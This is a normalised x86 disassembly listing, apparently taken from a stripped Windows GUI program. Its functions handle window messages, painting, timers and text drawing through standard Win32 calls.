mov eax [ edx + 0x10 ]
call eax
pop esi
sub_42f070
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_446a45
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20 ]
mov [ fs : 0x0 ] eax
mov edi ecx
cmp [ ebp + 0x1c ] 0x0
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ esp + 0x10 ] 0x1
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push eax
mov eax [ ebp + 0xc ]
push ecx
call sub_430420
add esp 0x10
test eax eax
jne r-xdata
mov eax [ edi + 0x18 ]
push esi
mov esi [ ebp + 0x10 ]
push esi
mov [ eax + 0x20 ] 0x0
mov eax [ edi - 0x74 ]
mov eax [ eax + 0x7c ]
lea ecx [ edi - 0x74 ]
push edx
mov edx [ ebp + 0x8 ]
push edx
call eax
mov [ ebx ] eax
mov ecx [ edi + 0x18 ]
xor eax eax
cmp [ ecx + 0x20 ] eax
setne al
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx edi
call sub_430330
cmp [ esp + 0x10 ] 0x0
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
jne r-xdata
mov eax 0x1
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov edx [ ebp + 0xc ]
cmp edx 0xf
jne r-xdata
mov ebx edx
mov edx [ ebp + 0xc ]
cmp edx 0x14
jne r-xdata
mov edx [ ebp + 0x10 ]
push edx
lea esi [ edi - 0x74 ]
call sub_42fcb0
mov [ ebx ] eax
cmp edx 0x200
jne r-xdata
mov eax [ edi + 0x18 ]
mov [ eax + 0x20 ] 0x1
mov [ esp + 0x28 ] 0xffffffff
mov [ ebx ] 0x1
mov eax [ edi + 0x18 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
cmp edx 0x2a3
jne r-xdata
mov ecx [ edi + 0x18 ]
mov [ ecx + 0x20 ] 0x1
mov edx esi
shr edx 0x10
movsx ecx dx
mov edx [ edi - 0x74 ]
mov edx [ edx + 0x88 ]
mov [ esp + 0x18 ] ecx
push [ esp + 0x18 ]
movsx eax si
lea ecx [ edi - 0x74 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call edx
mov [ ebx ] 0x0
mov eax [ edi + 0x18 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov [ ebx ] 0x0
cmp [ edi + 0x24 ] 0x0
je r-xdata
lea eax [ edx - 0x13 ]
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
cmp edx 0x2a1
jne r-xdata
mov ecx [ edi + 0x18 ]
mov [ ecx + 0x20 ] 0x1
mov edx [ edi - 0x74 ]
mov eax [ edx + 0x8c ]
lea ecx [ edi - 0x74 ]
call eax
mov [ ebx ] 0x0
mov ecx [ edi + 0x18 ]
cmp [ ecx + 0x20 ] 0x0
je r-xdata
mov eax 0x1
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov edx [ edi + 0x18 ]
mov [ edx + 0x20 ] 0x1
mov ecx esi
shr ecx 0x10
movsx edx cx
mov [ esp + 0x18 ] edx
push [ esp + 0x18 ]
mov edx [ edi - 0x74 ]
mov edx [ edx + 0x90 ]
movsx eax si
lea ecx [ edi - 0x74 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call edx
mov [ ebx ] 0x0
mov eax [ edi + 0x18 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax 0x1
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_42f2c0
push ebp
mov ebp esp
push 0xffffffff
push sub_446942
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
call sub_40e3c0
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ eax + 0x70 ] r--data
mov cl 0x1
mov [ ebp - 0x4 ] cl
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0x68 ] cl
mov [ ebp - 0x4 ] 0x2
lea ecx [ eax + 0x74 ]
lea esi [ ecx + 0x8 ]
mov [ ecx + 0x4 ] edx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] esi
mov [ esi + 0xc ] edx
mov [ ebp - 0x4 ] 0x4
mov [ ecx + 0x18 ] edx
mov [ ecx + 0x1c ] edx
mov [ ebp - 0x4 ] 0x5
mov esi [ DefWindowProcW@IAT ]
mov [ ecx + 0x20 ] esi
mov [ ebp - 0x4 ] 0x6
mov [ ecx ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ecx ] r--data
or ecx 0xffffffff
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0xc ] 0x18
mov [ eax + 0x9c ] ecx
mov [ eax + 0xa0 ] edx
mov [ eax + 0xa4 ] edx
mov [ eax + 0xa8 ] edx
mov [ eax + 0xac ] edx
mov [ eax + 0xb0 ] edx
mov [ eax + 0xb4 ] edx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_42f3b0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_42f3e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42f3e0
push ebp
mov ebp esp
push 0xffffffff
push sub_447852
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
lea eax [ esi + 0x74 ]
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ eax ] r--data
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
add eax 0x8
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax + 0xc ]
cmp eax ecx
je r-xdata
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x6
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_443ef4
sub_42f480
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
mov esi ecx
jne r-xdata
mov ecx [ esi + 0x18 ]
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ecx
mov ecx esi
call edx
test al al
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x98 ]
mov ecx esi
xor bl bl
call edx
pop esi
mov al bl
pop ebx
pop ebp
retn 0x4
cmp [ esi + 0x25 ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x98 ]
mov bl 0x1
mov ecx esi
mov [ esi + 0x25 ] bl
call edx
pop esi
mov al bl
pop ebx
pop ebp
retn 0x4
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov eax [ esi + 0x70 ]
mov edx [ eax + 0x8 ]
lea ecx [ esi + 0x70 ]
call edx
sub_42f500
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
mov eax [ edi + 0x78 ]
mov [ esi + 0x9c ] eax
lea ecx [ edi + 0xb0 ]
lea ebx [ esp + 0x10 ]
lea eax [ esp + 0xc ]
mov [ esp + 0x10 ] 0x0
call sub_414260
mov eax [ esp + 0xc ]
xor ebx ebx
cmp eax [ edi + 0xb4 ]
je r-xdata
xor edi edi
mov edi [ eax + 0x10 ]
jmp r-xdata
mov edx [ esi + 0x38 ]
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x34 ]
mov [ esp + 0x4c ] edx
mov edx [ esi + 0x34 ]
mov [ esp + 0x44 ] eax
mov eax [ esi + 0x3c ]
mov [ esp + 0x48 ] ecx
mov ecx [ esi + 0x30 ]
push 0xfffffffe
mov [ esp + 0x2c ] edx
mov [ esp + 0x54 ] eax
mov eax [ esi + 0x38 ]
mov [ esp + 0x28 ] ecx
mov ecx [ esi + 0x3c ]
push 0xfffffffe
lea edx [ esp + 0x4c ]
push edx
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] ecx
call [ InflateRect@IAT ]
mov eax [ esi ]
mov eax [ eax + 0x94 ]
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
mov ecx esi
mov [ esp + 0x20 ] 0x50200200
mov [ esp + 0x1c ] ebx
call eax
mov eax [ esi + 0x18 ]
cmp eax ebx
je r-xdata
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax [ edi + 0x10 ]
mov edi [ esi + 0xa0 ]
mov [ esi + 0xa8 ] eax
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax [ edi + 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov [ esi + 0xa4 ] eax
mov [ esi + 0xa0 ] edi
cmp edi ebx
je r-xdata
mov [ esp + 0x10 ] ebx
lea ebx [ ebx ]
mov edx [ esp + 0x1c ]
push edx
lea eax [ esi + 0x94 ]
mov [ rw-data ] ebx
push eax
mov ebx rw-data
call sub_406b60
add esp 0x8
cmp [ esp + 0xc ] 0x0
movzx ebx ax
jne r-xdata
mov [ rw-data ] r--data
mov [ esp + 0x10 ] ecx
jmp r-xdata
mov eax [ eax + 0x18 ]
cmp eax ebx
jne r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
mov eax [ esp + 0xc ]
push ecx
push edx
mov edx [ esp + 0x18 ]
push eax
push 0x0
lea ecx [ esp + 0x54 ]
push ecx
push edx
lea eax [ esi + 0x74 ]
call sub_430650
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
mov [ esp + 0xc ] 0x56000000
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov [ esi + 0x98 ] bl
mov [ esp + 0x20 ] edx
mov [ esp + 0x1c ] eax
mov [ esp + 0xc ] ecx
cmp [ rw-data ] ebx
jne r-xdata
mov ecx [ eax + 0x60 ]
cmp ecx ebx
jne r-xdata
mov ecx [ esp + 0x54 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x4 ]
mov eax [ eax + 0xa0 ]
cmp eax ebx
jne r-xdata
mov ecx [ esi + 0x78 ]
push 0x1
push eax
push 0x30
push ecx
call [ SendMessageW@IAT ]
lea edx [ esp + 0x34 ]
push edx
push edi
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
call [ GetClientRect@IAT ]
mov eax [ esp + 0x28 ]
sub eax [ esp + 0x38 ]
mov ecx [ esp + 0x40 ]
lea edx [ eax + ecx + 0x4 ]
mov eax [ esi ]
lea ecx [ esp + 0x24 ]
mov [ esp + 0x30 ] edx
mov edx [ eax + 0x60 ]
push ecx
mov ecx esi
call edx
mov eax [ rw-data ]
sub_42f730
push ebp
mov ebp esp
push ebx
mov bl [ ebp + 0x8 ]
push esi
mov esi ecx
cmp [ esi + 0x24 ] 0x0
mov [ esi + 0x27 ] bl
je r-xdata
mov ecx [ esi + 0x78 ]
movzx eax bl
push eax
push ecx
call [ EnableWindow@IAT ]
mov edx [ esi + 0x78 ]
push 0x1
push 0x0
push edx
call [ InvalidateRect@IAT ]
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_42f7a0
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
cmp [ ecx + 0x9c ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
push ebx
push esi
push edi
jne r-xdata
mov ebx [ edx ]
mov esi ecx
call sub_42f900
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi [ edx ]
call sub_42f7e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42f7e0
push ebp
mov ebp esp
push 0xffffffff
push sub_445a35
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x90 ]
push eax
call [ CreateSolidBrush@IAT ]
mov edx [ esi + 0x34 ]
mov ecx [ esi + 0x30 ]
push 0xffffffff
mov [ ebp - 0x2c ] edx
mov ebx eax
mov eax [ esi + 0x38 ]
mov [ ebp - 0x30 ] ecx
mov ecx [ esi + 0x3c ]
push 0xffffffff
lea edx [ ebp - 0x30 ]
push edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] ecx
call [ InflateRect@IAT ]
push ebx
lea eax [ ebp - 0x30 ]
push eax
push edi
call [ FillRect@IAT ]
push ebx
call [ DeleteObject@IAT ]
mov edx [ esi + 0x78 ]
lea ecx [ ebp - 0x20 ]
xor ebx ebx
push ecx
push edx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
call [ GetClientRect@IAT ]
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
mov ecx eax
sub ecx [ ebp - 0x2c ]
cmp ecx edx
jle r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
mov ecx [ ebp - 0x30 ]
push 0xffffffff
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x20 ] ecx
mov ecx [ ebp - 0x28 ]
push 0xffffffff
lea edx [ ebp - 0x20 ]
push edx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
call [ InflateRect@IAT ]
mov [ ebp - 0x4 ] ebx
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x70 ]
push eax
push edi
call [ SetBkColor@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push ebx
push ebx
push ebx
lea ecx [ ebp - 0x20 ]
push ecx
push 0x2
push ebx
push ebx
push edi
call [ ExtTextOutW@IAT ]
push esi
push edi
call [ SetBkColor@IAT ]
sub_42f900
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ esi + 0xb0 ] 0x0
push edi
je r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x90 ]
push eax
call [ CreateSolidBrush@IAT ]
mov ecx [ esi + 0x34 ]
mov edx [ esi + 0x38 ]
mov edi eax
mov eax [ esi + 0x30 ]
push 0xffffffff
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x3c ]
push 0xffffffff
lea ecx [ ebp - 0x14 ]
push ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
call [ InflateRect@IAT ]
push edi
lea edx [ ebp - 0x14 ]
push edx
push ebx
call [ FillRect@IAT ]
push edi
call [ DeleteObject@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_443fba
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x78 ]
push eax
call [ CreateSolidBrush@IAT ]
mov edi eax
push edi
lea ecx [ esi + 0x30 ]
push ecx
push ebx
call [ FillRect@IAT ]
push edi
call [ DeleteObject@IAT ]
sub_42f9a0
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi ecx
cmp [ esi + 0xac ] 0x0
jne r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ esi + 0x78 ]
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] 0x10
mov [ ebp - 0xc ] 0x3
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x1
call [ TrackMouseEvent@IAT ]
mov [ esi + 0xac ] 0x1
sub_42f9f0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x20
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1c ] eax
push ebx
push esi
lea eax [ esp + 0xc ]
xor ebx ebx
push eax
mov esi ecx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
call [ GetCursorPos@IAT ]
mov edx [ esi + 0x78 ]
lea ecx [ esp + 0xc ]
push ecx
push edx
call [ ScreenToClient@IAT ]
mov ecx [ esi + 0x78 ]
lea eax [ esp + 0x14 ]
push eax
push ecx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
call [ GetClientRect@IAT ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
push edx
push eax
lea ecx [ esp + 0x1c ]
push ecx
call [ PtInRect@IAT ]
mov edx [ esi + 0x78 ]
push 0x1
push ebx
push edx
mov [ esi + 0xb0 ] eax
mov [ esi + 0xb4 ] ebx
mov [ esi + 0xac ] ebx
call [ InvalidateRect@IAT ]
cmp [ esi + 0x24 ] bl
je r-xdata
mov ecx [ esp + 0x24 ]
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_443fba
mov esp ebp
pop ebp
retn
cmp [ esi + 0x25 ] bl
je r-xdata
cmp [ esi + 0x26 ] bl
je r-xdata
mov ecx [ esi + 0x1c ]
cmp ecx ebx
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax + 0xab ] bl
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push ebx
push eax
push esi
call edx
sub_42fad0
push esi
mov esi ecx
mov eax [ esi + 0x78 ]
push 0x1
push 0x0
push eax
mov [ esi + 0xb0 ] 0x1
mov [ esi + 0xb4 ] 0x2
call [ InvalidateRect@IAT ]
cmp [ esi + 0x24 ] 0x0
je r-xdata
xor eax eax
pop esi
retn 0xc
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_42fb40
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x20
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1c ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi ecx
cmp eax 0x111
jne r-xdata
cmp eax 0x113
jne r-xdata
mov eax [ ebp + 0x10 ]
shr eax 0x10
cmp eax 0x1
jne r-xdata
mov ecx [ esp + 0x24 ]
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x7e8
jne r-xdata
xor ebx ebx
cmp [ esi + 0x1c ] ebx
je r-xdata
mov ecx [ esi + 0x78 ]
push 0x7e8
push ecx
call [ KillTimer@IAT ]
mov edx [ esi + 0x78 ]
push 0x1
push 0x0
push edx
call [ InvalidateRect@IAT ]
mov eax [ esi ]
mov edx [ eax + 0xa0 ]
mov ecx esi
call edx
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
call [ GetCursorPos@IAT ]
mov edx [ esi + 0x78 ]
lea ecx [ esp + 0xc ]
push ecx
push edx
call [ ScreenToClient@IAT ]
mov ecx [ esi + 0x78 ]
lea eax [ esp + 0x14 ]
push eax
push ecx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
call [ GetClientRect@IAT ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
push edx
push eax
lea ecx [ esp + 0x1c ]
push ecx
call [ PtInRect@IAT ]
mov [ esi + 0xb0 ] eax
cmp [ esi + 0x24 ] bl
je r-xdata
mov ecx [ esi + 0x78 ]
push ebx
push ebx
push 0x147
push ecx
call [ SendMessageW@IAT ]
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
push eax
mov eax [ esi + 0x8 ]
push eax
push 0x111
push esi
call edx
mov eax [ esi + 0x78 ]
push ebx
push 0xa
push 0x7e8
push eax
call [ SetTimer@IAT ]
xor eax eax
pop esi
pop ebx
mov ecx [ esp + 0x1c ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
cmp [ esi + 0x25 ] bl
je r-xdata
cmp [ esi + 0x26 ] bl
je r-xdata
mov ecx [ esi + 0x1c ]
cmp ecx ebx
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax + 0xab ] bl
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push ebx
push eax
push esi
call edx
sub_42fcb0
push ebp
mov ebp esp
push 0xffffffff
push sub_446a12
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x85 ] 0x0
cmp eax edi
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x70 ]
push eax
call [ CreateSolidBrush@IAT ]
mov ecx [ esi + 0x78 ]
mov ebx eax
lea eax [ ebp - 0x24 ]
push eax
push ecx
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
call [ GetClientRect@IAT ]
mov ecx [ ebp - 0x8c ]
lea edx [ ebp - 0x7c ]
push edx
lea eax [ ebp - 0xb0 ]
push eax
lea edi [ ebp - 0x24 ]
call sub_41b390
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0xb0 ]
push 0x1
push ecx
call [ SetBkMode@IAT ]
mov eax [ ebp - 0xb0 ]
push ebx
mov edx edi
push edx
push eax
call [ FillRect@IAT ]
mov edi [ ebp - 0xb0 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
mov [ ebp - 0x3c ] eax
sub eax [ esi + 0xa4 ]
mov [ ebp - 0x44 ] ecx
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x40 ] edx
mov edx [ esi ]
mov edx [ edx + 0x80 ]
lea eax [ ebp - 0x44 ]
push eax
mov [ ebp - 0x38 ] ecx
push edi
mov ecx esi
call edx
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x2c ] eax
sub eax [ esi + 0xa4 ]
mov [ ebp - 0x28 ] edx
mov edx [ esi ]
mov edx [ edx + 0x84 ]
mov [ ebp - 0x34 ] eax
mov eax [ esi + 0xa8 ]
add eax ecx
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x30 ] ecx
push edi
mov ecx esi
call edx
push ebx
call [ DeleteObject@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xb0 ]
push eax
call sub_41b480
cmp [ ebp - 0x85 ] 0x0
je r-xdata
mov ecx [ esi + 0x78 ]
lea eax [ ebp - 0x84 ]
push eax
push ecx
mov [ ebp - 0x85 ] 0x1
call [ BeginPaint@IAT ]
mov [ ebp - 0x8c ] eax
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov edx [ esi + 0x78 ]
lea ecx [ ebp - 0x84 ]
push ecx
push edx
call [ EndPaint@IAT ]
sub_42fe50
push ebp
mov ebp esp
push 0xffffffff
push sub_449a6d
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0xc ]
add [ esi + 0x4 ] 0x2
add [ esi ] 0x5
add [ esi + 0xc ] 0xfffffffe
cmp [ edi + 0x27 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x80 ]
mov [ ebp + 0xc ] ecx
je r-xdata
mov [ ebp + 0xc ] 0x787878
mov edx [ edi + 0x78 ]
push edx
call [ IsWindowEnabled@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov eax [ edi + 0x78 ]
mov ebx [ SendMessageW@IAT ]
push 0x0
push 0x0
add edi 0x78
push 0x31
push eax
call ebx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call [ SelectObject@IAT ]
mov edx [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
push edx
push eax
call [ SetTextColor@IAT ]
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
push 0x0
push 0x0
push 0x147
push ecx
call ebx
push edi
lea edi [ ebp + 0xc ]
mov ebx eax
call sub_430210
mov edx [ ebp + 0x8 ]
push 0x4
push esi
mov esi [ ebp + 0xc ]
or edi 0xffffffff
push edi
push esi
push edx
call [ DrawTextW@IAT ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call [ SelectObject@IAT ]
mov [ ebp - 0x4 ] 0x0
lea eax [ esi - 0x10 ]
lea edx [ eax + 0xc ]
mov ecx edi
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
sub_42ff80
push ebp
mov ebp esp
push 0xffffffff
push sub_445a09
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov esi ecx
mov [ ebp - 0x40 ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi [ esi + 0xa0 ]
cmp edi ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov ecx [ esi + 0xa4 ]
mov eax [ esi + 0xb4 ]
mov edi [ edi + 0x10 ]
imul eax ecx
shr eax 0x1
add ecx eax
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ esi + 0x78 ]
push eax
push ecx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
